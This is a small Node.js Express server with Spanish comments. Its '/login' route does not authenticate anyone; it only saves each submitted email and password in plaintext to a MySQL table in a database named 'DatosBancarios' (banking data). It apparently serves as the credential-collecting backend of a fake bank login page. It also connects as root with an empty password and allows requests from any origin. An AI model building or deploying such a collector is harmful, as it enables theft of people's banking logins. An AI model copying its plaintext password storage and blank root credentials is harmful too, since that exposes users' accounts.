const express = require('express');
const mysql = require('mysql');
const app = express();
const cors = require('cors');

// Configurar middleware para permitir JSON y CORS
app.use(express.json());
app.use(cors());

// Crear conexión con MySQL
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '',
  database: 'DatosBancarios'
});

db.connect((err) => {
  if (err) {
    console.error('Error conectando a la base de datos:', err);
    return;
  }
  console.log('Conectado a MySQL');
});

// Ruta para guardar datos de inicio de sesión
app.post('/login', (req, res) => {
  const { email, pass } = req.body;
  
  const query = 'INSERT INTO DatosClientes (Email, Pass) VALUES (?, ?)';
  db.query(query, [email, pass], (err, result) => {
    if (err) {
      return res.status(500).json({ message: 'Error al guardar los datos' });
    }
    res.status(200).json({ message: 'Datos guardados exitosamente' });
  });
});

// Iniciar servidor
app.listen(5000, () => {
  console.log('Servidor corriendo en el puerto 5000');
});